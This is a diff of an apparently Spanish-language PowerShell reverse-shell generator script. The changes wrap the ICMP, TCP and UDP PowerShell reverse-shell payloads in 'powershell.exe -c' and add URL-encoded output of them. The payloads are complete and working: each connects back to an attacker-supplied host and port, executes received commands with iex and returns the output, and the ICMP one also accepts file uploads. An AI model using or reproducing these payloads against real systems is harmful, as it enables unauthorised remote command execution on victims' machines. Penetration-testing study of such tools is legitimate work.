@@ -269,15 +269,15 @@ $r_xterm = @"
 xterm -display $Lhost":"$Lport
 "@
 $r_PowershellICMP = @"
-`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('C:\Temp\z',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }
+powershell.exe -c "`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('C:\Temp\z',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }"
 "@
 
 $r_PowershellTCP = @"
-`$c = New-Object System.Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (iex `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()
+powershell.exe -c "`$c = New-Object System.Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (iex `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()"
 "@
 
 $r_PowershellUDP = @"
-`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (iex `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()
+powershell.exe -c "`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (iex `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()"
 "@
 
 
@@ -296,6 +296,10 @@ if ($ruby -eq $true) {$r_ruby =  $r_ruby -replace " ","+" -replace "$", "%24" -r
 if ($java -eq $true) {$r_java = $r_java-replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24" ; $total = $r_java.Length -3; $r_java = $r_java.Substring(0,$total); write-host "$r_java `n"}
 if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_xterm.Length -3 ; $r_xterm = $r_xterm.Substring(0,$total); write-host "$r_xterm `n"}
 if ($netcat -eq $true) {$r_netcat = $r_netcat -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_netcat.Length -3 ; $r_netcat = $r_netcat.Substring(0,$total);write-host "$r_netcat `n"}
+if ($PowershellICMP -eq $true) {$r_PowershellICMP = $r_PowershellICMP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellICMP.Length -3 ; $r_PowershellICMP = $r_PowershellICMP.Substring(0,$total);write-host "$r_PowershellICMP `n"}
+if ($PowershellTCP -eq $true) {$r_PowershellTCP = $r_PowershellTCP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellTCP.Length -3 ; $r_PowershellTCP = $r_PowershellTCP.Substring(0,$total);write-host "$r_PowershellTCP `n"}
+if ($PowershellUDP -eq $true) {$r_PowershellUDP = $r_PowershellUDP -replace " ","+" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" -replace "$","%24"; $total = $r_PowershellUDP.Length -3 ; $r_PowershellUDP = $r_PowershellUDP.Substring(0,$total);write-host "$r_PowershellUDP `n"}
+
 
 ################################################################################ Spawn tty shell ################################################################################
 
@@ -362,6 +366,5 @@ if ($PowershellTCP -eq $true -and $metasploit -eq $true) {Write-Host "[" -Foregr
 if ($Powershelludp -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellUDP (proximas updates...)`n" }
 
 }
-
 
 
